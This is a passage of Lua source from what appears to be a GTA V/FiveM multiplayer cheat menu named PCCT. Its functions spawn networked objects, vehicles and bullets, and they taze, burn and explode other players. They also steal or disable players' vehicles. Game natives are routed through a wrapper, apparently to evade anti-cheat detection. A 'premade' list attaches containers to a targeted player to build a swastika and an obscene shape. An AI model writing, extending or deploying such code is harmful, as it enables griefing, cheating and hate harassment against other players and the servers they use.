        ["OBJECT"] = {"dt1_05_damage_slod", "dt1_05_build1_damage_lod", "ela_wdn_02lod_", "ela_wdn_04lod_", "apa_mp_apa_crashed_usaf_01a", "apa_mp_apa_yacht", "cloudhat_altostatus_a", "cloudhat_altitude_vlight_a", "cloudhat_cirrocumulus_a", "ch_prop_stunt_landing_zone_01a", "p_spinning_anus_s", "prop_gas_pump_1a", "prop_gas_pump_1b", "prop_gas_pump_1c", "prop_gas_pump_1d", "cargobob", "jet", "valor", "prop_med_jet_01", "xm_prop_base_jet_01", "xm_prop_base_jet_02", "prop_mp_spike_01", "prop_tyre_spike_01", "prop_container_ld2", "lts_prop_lts_ramp_03", "prop_jetski_ramp_01", "prop_mp_ramp_03_tu", "prop_skate_flatramp_cr", "stt_prop_ramp_adj_loop", "stt_prop_ramp_multi_loop_rb", "stt_prop_ramp_spiral_l", "stt_prop_ramp_spiral_l_m", "prop_const_fence03b_cr", "prop_const_fence02b", "prop_const_fence03a_cr", "prop_fnc_farm_01e", "prop_fnccorgm_02c", "ch3_01_dino", "p_pallet_02a_s", "prop_conc_blocks01a", "hei_prop_cash_crate_half_full", "prop_consign_01a", "prop_byard_net02", "prop_mb_cargo_04b", "prop_mb_crate_01a_set", "prop_pipe_stack_01", "prop_roadcone01c", "prop_rub_cage01b", "prop_sign_road_01a", "prop_sign_road_03m", "prop_traffic_rail_2", "prop_traffic_rail_1a", "prop_traffic_03a", "prop_traffic_01d", "prop_skid_trolley_1", "hei_prop_yah_seat_03", "hei_prop_yah_table_03", "lts_prop_lts_elecbox_24", "lts_prop_lts_elecbox_24b", "p_airdancer_01_s", "p_amb_brolly_01", "p_amb_brolly_01_s", "p_dumpster_t", "p_ld_coffee_vend_01", "p_patio_lounger1_s", "p_yacht_sofa_01_s", "prop_air_bagloader2_cr", "prop_air_bigradar", "prop_air_blastfence_01", "prop_air_stair_01", "prop_air_sechut_01", "prop_airport_sale_sign"},

        ["BULLET"] = {"WEAPON_STUNGUN", "WEAPON_RPG", "WEAPON_RAILGUN", "WEAPON_PISTOL", "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_FIREWORK", "WEAPON_SNIPERRIFLE", "WEAPON_RAYPISTOL"},

        ["VEHICLE"] = car_spam,

        ["PREMADE"] = {

            ["SWASTIKA"] = function(ent, offZ)

                if PCCT.Config.SafeMode then return PCCT:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo") end



                CreateThread(function()

                    local where = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0)



                    if not PCCT:GetFunction("IsEntityAPed")(ent) then

                        where = vector3(where.x, where.y, where.z + 5.0)

                    end



                    if offZ then

                        where = vector3(where.x, where.y, where.z + offZ)

                    end



                    local column = {

                        ["up"] = {},

                        ["across"] = {}

                    }



                    for i = 0, 7 do

                        column["up"][i + 1] = {

                            x = 0.0,

                            y = 0.0,

                            z = 1.0 + (2.6 * (i + 1)),

                            _p = 90.0,

                            _y = 0.0,

                            _r = 0.0

                        }

                    end



                    for i = 0, 8 do

                        column["across"][i + 1] = {

                            x = 10.4 + (-2.6 * i),

                            y = 0.0,

                            z = 11.6,

                            _p = 90.0,

                            _y = 0.0,

                            _r = 0.0

                        }

                    end



                    local arms = {

                        ["bottom_right"] = {},

                        ["across_up"] = {},

                        ["top_left"] = {},

                        ["across_down"] = {}

                    }



                    for i = 0, 4 do

                        arms["bottom_right"][i] = {

                            x = -2.6 * i,

                            y = 0.0,

                            z = 1.0,

                            _p = 90.0,

                            _y = 0.0,

                            _r = 0.0

                        }



                        arms["top_left"][i] = {

                            x = 2.6 * i,

                            y = 0.0,

                            z = 22.2,

                            _p = 90.0,

                            _y = 0.0,

                            _r = 0.0

                        }



                        arms["across_down"][i + 1] = {

                            x = 10.4,

                            y = 0.0,

                            z = 12.6 - (2.25 * (i + 1)),

                            _p = 90.0,

                            _y = 0.0,

                            _r = 0.0

                        }

                    end



                    for i = 0, 3 do

                        arms["across_up"][i + 1] = {

                            x = -10.4,

                            y = 0.0,

                            z = 11.6 + (2.6 * (i + 1)),

                            _p = 90.0,

                            _y = 0.0,

                            _r = 0.0

                        }

                    end



                    local positions = {column["up"], column["across"], arms["bottom_right"], arms["across_up"], arms["top_left"], arms["across_down"]}

                    PCCT:RequestModelSync("prop_container_05a")



                    for _, seg in picho.pairs(positions) do

                        for k, v in picho.pairs(seg) do

                            local obj = PCCT:GetFunction("CreateObject")(PCCT:GetFunction("GetHashKey")("prop_container_05a"), where.x, where.y, where.z + (offZ or 0), true, true, true)

                            PCCT:DoNetwork(obj)

                            PCCT:GetFunction("AttachEntityToEntity")(obj, ent, PCCT:GetFunction("IsEntityAPed")(ent) and PCCT:GetFunction("GetPedBoneIndex")(ped, 57005) or 0, v.x, v.y, v.z + (offZ or 0), v._p, v._y, v._r, false, true, false, false, 1, true)

                            Wait(80)

                        end

                    end

                end)

            end,

            ["DICK"] = function(ent)

                if PCCT.Config.SafeMode then return PCCT:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo") end



                CreateThread(function()

                    local where = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0)



                    if not PCCT:GetFunction("IsEntityAPed")(ent) then

                        where = vector3(where.x, where.y, where.z + 5.0)

                    end



                    PCCT:RequestModelSync("stt_prop_stunt_bowling_ball")

                    local ball_l = PCCT:GetFunction("CreateObject")(PCCT:GetFunction("GetHashKey")("stt_prop_stunt_bowling_ball"), where.x, where.y, where.z, true, true, true)

                    PCCT:DoNetwork(ball_l)

                    PCCT:GetFunction("AttachEntityToEntity")(ball_l, ent, PCCT:GetFunction("IsEntityAPed")(ent) and PCCT:GetFunction("GetPedBoneIndex")(ped, 57005) or 0, -3.0, 0, 0.0, 0.0, 0.0, 180.0, false, true, false, false, 1, true)

                    Wait(50)

                    local ball_r = PCCT:GetFunction("CreateObject")(PCCT:GetFunction("GetHashKey")("stt_prop_stunt_bowling_ball"), where.x, where.y, where.z, true, true, true)

                    PCCT:DoNetwork(ball_r)

                    PCCT:GetFunction("AttachEntityToEntity")(ball_r, ent, PCCT:GetFunction("IsEntityAPed")(ent) and PCCT:GetFunction("GetPedBoneIndex")(ped, 57005) or 0, 3.0, 0, 0.0, 0.0, 0.0, 0.0, false, true, false, false, 1, true)

                    Wait(50)

                    local shaft = PCCT:GetFunction("CreateObject")(PCCT:GetFunction("GetHashKey")("prop_container_ld2"), where.x, where.y, where.z, true, true, true)

                    PCCT:DoNetwork(shaft)

                    PCCT:GetFunction("AttachEntityToEntity")(shaft, ent, PCCT:GetFunction("IsEntityAPed")(ent) and PCCT:GetFunction("GetPedBoneIndex")(ped, 57005) or 0, -1.5, 0, 5.0, 90.0, 0, 90.0, false, true, false, false, 1, true)

                    Wait(50)

                end)

            end

        }

    }



    local preview_object

    local preview_object_model

    local premade_options = {}

    local funcs = {}



    for name, func in picho.pairs(PCCT.FreeCam.SpawnerOptions["PREMADE"]) do

        premade_options[#premade_options + 1] = name

        funcs[#funcs + 1] = func

    end



    function PCCT.FreeCam:DeletePreview()

        if preview_object and PCCT:GetFunction("DoesEntityExist")(preview_object) then

            PCCT.Util:DeleteEntity(preview_object)

            preview_object = nil

        end



        preview_object = nil

        preview_object_model = nil

    end



    local bad_models = {}

    local _loading

    local doing_alpha

    local last_alpha

    local cur_notifs



    function PCCT.FreeCam:Spawner(where, heading, type)

        local name, options

        local cam_rot = PCCT:GetFunction("GetCamRot")(self.Cam, 0)

        if self.DraggingEntity and PCCT:GetFunction("DoesEntityExist")(self.DraggingEntity) then return self:DeletePreview() end



        if type == "PED" then

            options = self.SpawnerOptions["PED"]



            if selected_spawner_opt > #options then

                selected_spawner_opt = 1

            end



            if preview_object then

                self:DeletePreview()

            end



            name = "Ped List" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"

            PCCT:SetIbuttons({{PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["LEFTCTRL"], 0), "Invisible"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["LEFTSHIFT"], 0), "God Mode"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["MOUSE1"], 0), "Select"}, {"b_117", "Change Mode"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["E"], 0), "Clone"}})

        elseif type == "BULLET" then

            PCCT:SetIbuttons({{"b_117", "Change Mode"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["ENTER"], 0), "Shoot Bullet"}})

            options = self.SpawnerOptions["BULLET"]



            if selected_spawner_opt > #options then

                selected_spawner_opt = 1

            end



            name = "Bullet List" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"

        elseif type == "OBJECT" then

            asking_weapon = false

            selected_weapon_opt = 1

            options = self.SpawnerOptions["OBJECT"]



            if selected_spawner_opt > #options then

                selected_spawner_opt = 1

            end



            local cur_model = options[selected_spawner_opt]



            if preview_object_model ~= cur_model and not _loading then

                _loading = true



                CreateThread(function()

                    if not PCCT:RequestModelSync(cur_model, 500) and not bad_models[cur_model] then

                        _loading = false

                        self:DeletePreview()

                        bad_models[cur_model] = true



                        return PCCT:AddNotification("ERROR", "Failed to load model ~r~" .. cur_model, 5000)

                    end



                    if bad_models[cur_model] then

                        _loading = false

                        self:DeletePreview()



                        return

                    end



                    if PCCT:GetFunction("HasModelLoaded")(cur_model) then

                        _loading = false

                        self:DeletePreview()

                        preview_object = PCCT:GetFunction("CreateObject")(PCCT:GetFunction("GetHashKey")(cur_model), where.x, where.y, where.z + 0.5, false, true, true)

                        PCCT:GetFunction("SetEntityCoords")(preview_object, where.x, where.y, where.z + 0.5, false, false, false, false)

                        PCCT:GetFunction("SetEntityAlpha")(preview_object, 100)

                        PCCT:GetFunction("FreezeEntityPosition")(preview_object, true)

                        PCCT:GetFunction("SetEntityRotation")(preview_object, 0.0, 0.0, cam_rot.z + 0.0)

                        PCCT:GetFunction("SetEntityCollision")(preview_object, false, false)

                        preview_object_model = cur_model

                    end

                end)

            end



            if preview_object and PCCT:GetFunction("DoesEntityExist")(preview_object) then

                PCCT:GetFunction("SetEntityCoords")(preview_object, where.x, where.y, where.z + 0.5, false, false, false, false)

                PCCT:GetFunction("SetEntityAlpha")(preview_object, 100)

                PCCT:GetFunction("FreezeEntityPosition")(preview_object, true)

                PCCT:GetFunction("SetEntityRotation")(preview_object, 0.0, 0.0, cam_rot.z + 0.0)

                PCCT:GetFunction("SetEntityCollision")(preview_object, false, false)

            end



            name = "Object List" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"

            PCCT:SetIbuttons({{PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["LEFTCTRL"], 0), "Attach (Hovered)"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["MOUSE1"], 0), "Select"}, {"b_117", "Change Mode"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["E"], 0), "Clone"}})

        elseif type == "PREMADE" then

            asking_weapon = false

            selected_weapon_opt = 1

            options = premade_options



            if selected_spawner_opt > #options then

                selected_spawner_opt = 1

            end



            if preview_object then

                self:DeletePreview()

            end



            name = "Premade List" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"

        elseif type == "VEHICLE" then

            asking_weapon = false

            selected_weapon_opt = 1

            options = self.SpawnerOptions["VEHICLE"]



            if selected_spawner_opt > #options then

                selected_spawner_opt = 1

            end



            local cur_model = options[selected_spawner_opt]



            if preview_object_model ~= cur_model and not _loading then

                if preview_object then

                    self:DeletePreview()

                end



                _loading = true



                CreateThread(function()

                    if not PCCT:RequestModelSync(cur_model, 500) and not bad_models[cur_model] then

                        _loading = false

                        self:DeletePreview()

                        bad_models[cur_model] = true



                        return PCCT:AddNotification("ERROR", "Failed to load model ~r~" .. cur_model, 5000)

                    end



                    if bad_models[cur_model] then

                        _loading = false

                        self:DeletePreview()



                        return

                    end



                    if PCCT:GetFunction("HasModelLoaded")(cur_model) then

                        _loading = false

                        self:DeletePreview()

                        preview_object = PCCT:GetFunction("CreateObject")(PCCT:GetFunction("GetHashKey")(cur_model), where.x, where.y, where.z, false, true, true)

                        PCCT:GetFunction("SetEntityCoords")(preview_object, where.x, where.y, where.z + PCCT:GetModelHeight(preview_object), false, false, false, false)

                        PCCT:GetFunction("SetEntityAlpha")(preview_object, 100)

                        PCCT:GetFunction("FreezeEntityPosition")(preview_object, true)

                        PCCT:GetFunction("SetEntityRotation")(preview_object, 0.0, 0.0, cam_rot.z + 0.0)

                        PCCT:GetFunction("SetEntityCollision")(preview_object, false, false)

                        preview_object_model = cur_model

                    end

                end)

            end



            if preview_object and PCCT:GetFunction("DoesEntityExist")(preview_object) then

                PCCT:GetFunction("SetEntityCoords")(preview_object, where.x, where.y, where.z + PCCT:GetModelHeight(preview_object), false, false, false, false)

                PCCT:GetFunction("SetEntityAlpha")(preview_object, 100)

                PCCT:GetFunction("FreezeEntityPosition")(preview_object, true)

                PCCT:GetFunction("SetEntityRotation")(preview_object, 0.0, 0.0, cam_rot.z + 0.0)

                PCCT:GetFunction("SetEntityCollision")(preview_object, false, false)

            end



            name = "Vehicle List" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"

        end



        if asking_weapon then

            options = self.SpawnerOptions["WEAPONS"]

            name = "Weapon List (" .. selected_weapon_opt .. "/" .. #options .. ")"

        end



        PCCT.Painter:DrawText("[" .. ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, PCCT.Name) .. "] " .. (name or "?"), 4, false, PCCT:ScrW() - 360 - 21 - offX, 21, 0.35, 255, 255, 255, 255)

        local sY = 30

        local max_opts = 30

        local cur_opt = (asking_weapon and selected_weapon_opt or selected_spawner_opt)

        local count = 0

        local total_opts = (#options or {})

        local can_see = true



        for id, val in picho.pairs(options or {}) do

            if total_opts > max_opts then

                can_see = cur_opt - 10 <= id and cur_opt + 10 >= id

            else

                count = 0

            end



            if can_see and count <= 10 then

                local r, g, b = 255, 255, 255



                if (asking_weapon and selected_weapon_opt or selected_spawner_opt) == id then

                    r, g, b = PCCT.Config.Tertiary[1], PCCT.Config.Tertiary[2], PCCT.Config.Tertiary[3]

                end



                PCCT.Painter:DrawText(val, 4, false, PCCT:ScrW() - 360 - 21 - offX, 21 + sY, 0.35, r, g, b, 255)

                sY = sY + 20

                count = count + 1

            end

        end



        if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["DOWN"]) and not PCCT.Showing then

            if asking_weapon then

                local new = selected_weapon_opt + 1



                if options[new] then

                    selected_weapon_opt = new

                else

                    selected_weapon_opt = 1

                end

            else

                local new = selected_spawner_opt + 1



                if options[new] then

                    selected_spawner_opt = new

                else

                    selected_spawner_opt = 1

                end

            end

        end



        if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["UP"]) and not PCCT.Showing then

            if asking_weapon then

                local new = selected_weapon_opt - 1



                if options[new] then

                    selected_weapon_opt = new

                else

                    selected_weapon_opt = #options

                end

            else

                local new = selected_spawner_opt - 1



                if options[new] then

                    selected_spawner_opt = new

                else

                    selected_spawner_opt = #options

                end

            end

        end



        if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["ENTER"]) and not PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MOUSE1"]) and not PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["SPACE"]) and not PCCT.Showing then

            if type == "PED" then

                if not asking_weapon then

                    selected_ped = options[selected_spawner_opt]

                    asking_weapon = true

                else

                    selected_weapon = options[selected_weapon_opt]

                    local ped = PCCT:SpawnPed(where, heading, selected_ped, selected_weapon)



                    if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTSHIFT"]) then

                        SetEntityInvincible(ped, true)

                    end



                    if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTCTRL"]) then

                        PCCT:GetFunction("SetEntityVisible")(ped, false)

                    end



                    PCCT:AddNotification("EXITO", "Ped spawneada.", 5000)

                end

            elseif type == "OBJECT" then

                local object = options[selected_spawner_opt]

                PCCT:RequestModelSync(object)

                local obj = PCCT:GetFunction("CreateObject")(PCCT:GetFunction("GetHashKey")(object), where.x, where.y, where.z, true, true, true)

                PCCT:DoNetwork(obj)

                PCCT:GetFunction("SetEntityRotation")(obj, 0.0, 0.0, cam_rot.z + 0.0)



                if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTCTRL"]) and PCCT:GetFunction("DoesEntityExist")(self.HoveredEntity) then

                    PCCT:GetFunction("AttachEntityToEntity")(obj, self.HoveredEntity, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, true, true, true, 1, false)

                end



                Wait(50)

            elseif type == "PREMADE" then

                local func = funcs[selected_spawner_opt]

                func(self.HoveredEntity)

            elseif type == "VEHICLE" then

                local model = options[selected_spawner_opt]

                PCCT:RequestModelSync(model)

                local veh = PCCT:GetFunction("CreateVehicle")(PCCT:GetFunction("GetHashKey")(model), where.x, where.y, where.z + PCCT:GetModelHeight(preview_object), 0.0, true, true)

                PCCT:DoNetwork(veh)

                PCCT:GetFunction("SetEntityRotation")(veh, 0.0, 0.0, cam_rot.z + 0.0)

            elseif type == "BULLET" then

                local weapon = options[selected_spawner_opt]

                PCCT:GetFunction("ShootSingleBulletBetweenCoords")(camX, camY, camZ, where.x, where.y, where.z, 1.0, true, PCCT:GetFunction("GetHashKey")(weapon), PCCT.LocalPlayer, true, false, 100.0)

            end

        end



        if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["BACKSPACE"]) and not PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MOUSE2"]) and asking_weapon and not PCCT.Showing then

            asking_weapon = false

            selected_weapon_opt = 1

        end



        PCCT.Painter:DrawRect(PCCT:ScrW() - 360 - 21 - offX, 20, 360, sY + 8, 0, 0, 0, 200)

        PCCT.Painter:DrawRect(PCCT:ScrW() - 360 - 21 - offX, 49, 360, 2, PCCT.Config.Tertiary[1], PCCT.Config.Tertiary[2], PCCT.Config.Tertiary[3], 255)

    end



    local rotP, rotY, rotR

    local dist = {0, 45, 90, 135, 180, -45, -90, -135, -180}

    local smallest, index = picho.math.huge, 0



    local function _snap(rot)

        for _, val in picho.pairs(dist) do

            local diff = picho.math.abs(val - rot)



            if diff <= smallest then

                smallest = diff

                index = _

            end

        end



        return dist[index] or rot

    end



    function PCCT:KickOutAllPassengers(ent, specific)

        for i = -1, PCCT:GetFunction("GetVehicleMaxNumberOfPassengers")(ent) - 1 do

            if not PCCT:GetFunction("IsVehicleSeatFree")(ent, i) and (not specific or specific == i) then

                PCCT:GetFunction("ClearPedTasks")(PCCT:GetFunction("GetPedInVehicleSeat")(ent, i))

                PCCT:GetFunction("ClearPedSecondaryTask")(PCCT:GetFunction("GetPedInVehicleSeat")(ent, i))

                PCCT:GetFunction("ClearPedTasksImmediately")(PCCT:GetFunction("GetPedInVehicleSeat")(ent, i))

            end

        end

    end



    local _stealing

    local _stealing_ped



    function PCCT.FreeCam:DoSteal(ent)

        PCCT:SetIbuttons({{PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["LEFTSHIFT"], 0), "Invisible"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["LEFTALT"], 0), "Fuck Up Speed"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["R"], 0), "Kick Out Driver"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["MOUSE2"], 0), "Steal (NPC)"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["MOUSE1"], 0), "Steal (Self)"}, {"b_117", "Change Mode"}})

        if not self:CheckType(ent, "VEHICLE") then return end



        if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MOUSE2"]) then

            CreateThread(function()

                _stealing = ent

                local model = PCCT.FreeCam.SpawnerOptions.PED[picho.math.random(1, #PCCT.FreeCam.SpawnerOptions.PED)]



                if not PCCT:RequestModelSync(model) then

                    _stealing = nil



                    return PCCT:AddNotification("ERROR", "Failed to steal vehicle!")

                end



                local c = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(_stealing, 0.0, 0.0, 0.0)

                local x, y, z = c.x, c.y, c.z

                local out, pos = PCCT:GetFunction("GetClosestMajorVehicleNode")(x, y, z, 10.0, 0)



                if not out then

                    pos = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(_stealing, picho.math.random(-6, 6) + 0.0, picho.math.random(-6, 6) + 0.0, 0.0)

                end



                local random_npc = PCCT:GetFunction("CreatePed")(24, PCCT:GetFunction("GetHashKey")(model), pos.x, pos.y, pos.z, 0.0, true, true)

                _stealing_ped = random_npc



                if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTSHIFT"]) then

                    PCCT:GetFunction("SetEntityVisible")(random_npc, false)

                end



                PCCT:GetFunction("SetPedAlertness")(random_npc, 0.0)

                local success = PCCT:StealVehicleThread(random_npc, _stealing)

                PCCT:GetFunction("TaskVehicleDriveWander")(random_npc, _stealing, 1000.0, 60)

                local timeout = 0



                if not success then

                    _stealing = nil

                    _stealing_ped = nil



                    return

                end



                while PCCT:GetFunction("DoesEntityExist")(_stealing) and PCCT:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc and not PCCT:GetFunction("IsEntityDead")(random_npc) and timeout <= 25000 do

                    timeout = timeout + 10

                    Wait(100)

                end



                if PCCT:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc then

                    _stealing = nil



                    return PCCT:AddNotification("ERROR", "Failed to steal vehicle!")

                end



                _stealing_ped = nil

                _stealing = nil

            end)

        elseif PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MOUSE1"]) then

            CreateThread(function()

                if PCCT.Config.SafeMode then

                    PCCT:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo")

                else

                    PCCT:KickOutAllPassengers(ent)

                    _stealing = ent

                    PCCT:GetFunction("TaskWarpPedIntoVehicle")(PCCT.LocalPlayer, ent, -1)

                    _stealing_ped = nil

                    _stealing = nil

                end

            end)

        elseif PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["R"]) then

            if PCCT.Config.SafeMode then

                PCCT:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo")

            else

                CreateThread(function()

                    _stealing = ent

                    local driver = PCCT:GetFunction("GetPedInVehicleSeat")(ent, -1)

                    PCCT:KickOutAllPassengers(ent, -1)

                    PCCT:GetFunction("TaskWanderStandard")(driver)

                    _stealing_ped = nil

                    _stealing = nil

                end)

            end

        end



        if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["LEFTALT"]) then

            CreateThread(function()

                PCCT:GetFunction("NetworkRequestControlOfEntity")(ent)



                if PCCT:GetFunction("NetworkHasControlOfEntity")(ent) then

                    PCCT:GetFunction("ModifyVehicleTopSpeed")(ent, 250000.0)



                    return PCCT:AddNotification("EXITO", "Velocidad aumentada!")

                end

            end)

        end



        self:DrawBoundingBox(ent, 122, 177, 220, 50)

        self:DrawInfoCard(ent)

    end



    function PCCT.FreeCam:DoTaze(ent, endCoords)

        PCCT:SetIbuttons({{PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["MOUSE1"], 0), "Taze"}, {"b_117", "Change Mode"}})



        if PCCT:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then

            self:DrawBoundingBox(ent, 50, 122, 200, 50)

        end



        if IsDisabledControlJustPressed(0, PCCT.Keys["MOUSE1"]) then

            if PCCT:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then

                PCCT:TazePlayer(ent)

            else

                PCCT:GetFunction("ShootSingleBulletBetweenCoords")(camX, camY, camZ, endCoords.x, endCoords.y, endCoords.z, 1, true, PCCT:GetFunction("GetHashKey")("WEAPON_STUNGUN"), PCCT.LocalPlayer, true, false, 24000.0)

            end

        end

    end



    function PCCT.FreeCam:DoHydrant(ent, endCoords)

        PCCT:SetIbuttons({{PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["MOUSE1"], 0), "Hydrant"}, {"b_117", "Change Mode"}})



        if PCCT:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then

            self:DrawBoundingBox(ent, 50, 122, 200, 50)

        end



        if IsDisabledControlJustPressed(0, PCCT.Keys["MOUSE1"]) then

            if PCCT:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then

                PCCT:HydrantPlayer(ent)

            else

                PCCT:GetFunction("AddExplosion")(endCoords.x, endCoords.y, endCoords.z, 13, 100.0, false, false, 0.0)

            end

        end

    end



    function PCCT.FreeCam:DoFire(ent, endCoords)

        PCCT:SetIbuttons({{PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["MOUSE1"], 0), "Fire"}, {"b_117", "Change Mode"}})



        if PCCT:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then

            self:DrawBoundingBox(ent, 50, 122, 200, 50)

        end



        if IsDisabledControlJustPressed(0, PCCT.Keys["MOUSE1"]) then

            if PCCT:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then

                PCCT:FirePlayer(ent)

            else

                PCCT:GetFunction("AddExplosion")(endCoords.x, endCoords.y, endCoords.z, 12, 100.0, false, false, 0.0)

            end

        end

    end



    function PCCT.FreeCam:DoExplosion(ent, endCoords)

        PCCT:SetIbuttons({{PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["MOUSE1"], 0), "Explode"}, {"b_117", "Change Mode"}})



        if PCCT:GetFunction("DoesEntityExist")(ent) and (_is_ped_player(ent) or PCCT:GetFunction("IsEntityAVehicle")(ent)) then

            self:DrawBoundingBox(ent, 50, 122, 200, 50)

        end



        if IsDisabledControlJustPressed(0, PCCT.Keys["MOUSE1"]) then

            if PCCT:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then

                PCCT:GetFunction("AddExplosion")(PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)

            elseif PCCT:GetFunction("DoesEntityExist")(ent) and PCCT:GetFunction("IsEntityAVehicle")(ent) then

                PCCT:GetFunction("NetworkExplodeVehicle")(ent, true, false, false)

                PCCT:GetFunction("AddExplosion")(PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)

            else

                PCCT:GetFunction("AddExplosion")(endCoords.x, endCoords.y, endCoords.z, 7, 100000.0, true, false, 0.0)

            end

        end

    end



    local preview_spike_strip

    local spike_model = "p_stinger_04"



    function PCCT.FreeCam:DoSpikeStrips(ent, endCoords)

        if not preview_spike_strip then

            preview_spike_strip = PCCT:GetFunction("CreateObject")(PCCT:GetFunction("GetHashKey")(spike_model), endCoords.x, endCoords.y, endCoords.z + 0.025, false, true, true)

        end



        local rot = PCCT:GetFunction("GetCamRot")(self.Cam, 0)

        PCCT:GetFunction("SetEntityCoords")(preview_spike_strip, endCoords.x, endCoords.y, endCoords.z + 0.1, false, false, false, false)

        PCCT:GetFunction("SetEntityAlpha")(preview_spike_strip, 100)

        PCCT:GetFunction("FreezeEntityPosition")(preview_spike_strip, true)

        PCCT:GetFunction("SetEntityRotation")(preview_spike_strip, 0.0, 0.0, rot.z + 0.0)

        PCCT:GetFunction("SetEntityCollision")(preview_spike_strip, false, false)



        if IsDisabledControlJustPressed(0, PCCT.Keys["MOUSE1"]) then

            rot = PCCT:GetFunction("GetEntityRotation")(preview_spike_strip)

            local spike_strip = PCCT:GetFunction("CreateObject")(PCCT:GetFunction("GetHashKey")(spike_model), endCoords.x, endCoords.y, endCoords.z + 0.025, true, true, true)

            PCCT:DoNetwork(spike_strip)

            PCCT:GetFunction("SetEntityRotation")(spike_strip, rot)

            PCCT:GetFunction("FreezeEntityPosition")(spike_strip, true)

            picho.spike_ents[#picho.spike_ents + 1] = spike_strip

        end

    end



    function PCCT.FreeCam:DoDisable(ent, endCoords)

        if PCCT:GetFunction("IsEntityAVehicle")(ent) then

            if IsDisabledControlJustPressed(0, PCCT.Keys["MOUSE1"]) then

                PCCT:DisableVehicle(ent)

            end



            self:DrawBoundingBox(ent, 50, 122, 200, 50)

        end

    end



    local _stealing

    local _stealing_ped



    function PCCT.FreeCam:DoRCCar(ent, endCoords)

        PCCT:SetIbuttons({{PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["LEFTSHIFT"], 0), "Invisible"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["X"], 0), "Spawn (NPC)"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["R"], 0), "Release Car (If Active)"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["MOUSE2"], 0), "Steal (NPC)"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["MOUSE1"], 0), "Steal (Force)"}, {"b_117", "Change Mode"}})



        if _stealing then

            self:DrawBoundingBox(_stealing_ped, 255, 122, 184, 50)



            return self:DrawBoundingBox(_stealing, 255, 120, 255, 50)

        end



        if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["R"]) and PCCT.RCCar.On then

            PCCT:AddNotification("INFO", "Released RC Car!")

            _stealing = nil

            _stealing_ped = nil



            return PCCT:DoRCCar(false)

        end



        if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MOUSE2"]) and self:CheckType(ent, "VEHICLE") then

